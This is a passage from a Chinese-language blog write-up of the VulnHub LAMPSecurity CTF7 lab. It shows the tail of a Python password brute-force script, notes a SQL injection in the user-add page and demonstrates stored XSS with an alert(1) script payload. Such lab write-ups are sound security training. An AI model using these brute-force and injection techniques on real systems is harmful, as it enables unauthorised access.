class="number">1280</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;username: &#123;&#125;\tpassword: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, password))</span><br></pre></td></tr></table></figure>

<p>​	这里为什么不适用hydra这类的工具，因为靶机的密钥加密算法版本比较老，而Hydra 是一个用于密码破解和暴力破解的工具，通常用于测试系统的安全性和进行合法的渗透测试。它主要关注用户名和密码的破解，而不是密钥算法的选择，容易遇到到了密钥算法不匹配的问题。<img src="/images/image-20240321112032069.png" alt="image-20240321112032069"></p>
<h2 id="2-后台添加用户处存在SQL注入"><a href="#2-后台添加用户处存在SQL注入" class="headerlink" title="2. 后台添加用户处存在SQL注入"></a>2. 后台添加用户处存在SQL注入</h2><p>​	发现在 <a target="_blank" rel="noopener" href="http://192.168.70.197:8080/users.php?op=new_scr">http://192.168.70.197:8080/users.php?op=new_scr</a> (添加用户功能点)处存在SQL注入漏洞</p>
<p><img src="/images/image-20240321112503733.png" alt="image-20240321112503733"></p>
<h2 id="3-编辑处存在XSS漏洞"><a href="#3-编辑处存在XSS漏洞" class="headerlink" title="3. 编辑处存在XSS漏洞"></a>3. 编辑处存在XSS漏洞</h2><p>​	我们尝试对已有的内容进行编辑’<a target="_blank" rel="noopener" href="http://192.168.70.197:8080/trainings.php?msg=Updated%27%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E7%BC%96%E8%BE%91%E7%9A%84%E6%98%AFTrainings%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9">http://192.168.70.197:8080/trainings.php?msg=Updated&#39;，这里我编辑的是Trainings中的内容</a></p>
<p>​	在所有的条目中插入代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	更新保存后，成功弹窗</p>
<p><img src="/images/image-20240321112957947.png" alt="image-20240321112957947"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu6lf1hh000pa2vdhpblaj53" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16.67px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
          </li>
        
          <li>
            <a href="/2024/03/25/tools-CMD-attrib/">tools-CMD-attrib</a>
          </li>
        
          <li>
            <a href="/2024/03/25/web-XSS-FlashXss-xss-PDF/">web-XSS-FlashXss-xss-PDF</a>
          </li>
        
          <li>
            <a href="/2024/03/22/web-XSS-FlashXss-xss-labs20/">web-XSS-FlashXss-xss-labs20</a>
          </li>
        
          <li>
            <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/">web-XSS-FlashXss-xss-labs</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 R0seK1llere<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>